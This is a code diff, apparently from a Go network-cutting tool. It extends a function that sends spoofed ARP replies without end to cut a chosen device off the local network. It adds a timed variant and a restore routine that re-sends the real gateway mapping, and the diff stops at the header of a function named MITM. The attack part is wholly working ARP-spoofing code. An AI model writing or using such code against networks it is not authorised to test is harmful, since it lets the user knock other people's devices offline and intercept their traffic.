@@ -91,13 +91,54 @@ func (ns *NetworkScanner) NetScan(targetNet string) []Device {
 	}
 }
 
-func (ns *NetworkScanner) CutOffDevice(device Device,gateway string) {
+// CutOffDevice sends ARP spoofing packets indefinitely to isolate a device.
+func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {
 	for {
 		routerIp := net.ParseIP(gateway).To4()
 		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
-		time.Sleep(2 * time.Second) 
+		time.Sleep(2 * time.Second)
 	}
+}
 
+// CutOffDeviceFor isolates a device for the given duration, then restores it
+// by sending the correct ARP mapping back to the device.
+func (ns *NetworkScanner) CutOffDeviceFor(device Device, gateway string, duration time.Duration) {
+	deadline := time.Now().Add(duration)
+	routerIp := net.ParseIP(gateway).To4()
+	for time.Now().Before(deadline) {
+		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
+		time.Sleep(2 * time.Second)
+	}
+	ns.RestoreDevice(device, gateway)
+}
+
+// RestoreDevice sends the correct ARP reply so the device re-learns the real
+// gateway MAC address.  The scanner must still be able to reach the gateway
+// (i.e. it knows the gateway MAC via a prior scan) – if not, it performs an
+// ARP request for the gateway first.
+func (ns *NetworkScanner) RestoreDevice(device Device, gateway string) {
+	routerIp := net.ParseIP(gateway).To4()
+	if routerIp == nil {
+		return
+	}
+	// Try to resolve gateway MAC via ARP scan of a /32 prefix.
+	gwDevices := ns.NetScan(gateway + "/32")
+	var gwMAC net.HardwareAddr
+	for _, d := range gwDevices {
+		if d.IP.Equal(routerIp) {
+			gwMAC = d.MAC
+			break
+		}
+	}
+	if gwMAC == nil {
+		// Cannot resolve gateway MAC; skip restore to avoid misleading the target.
+		return
+	}
+	// Send 3 gratuitous ARPs so the target definitely re-learns the mapping.
+	for i := 0; i < 3; i++ {
+		SendARPReply(ns.handle, device.MAC, device.IP, gwMAC, routerIp)
+		time.Sleep(500 * time.Millisecond)
+	}
 }
 
 func MITM(device Device) {
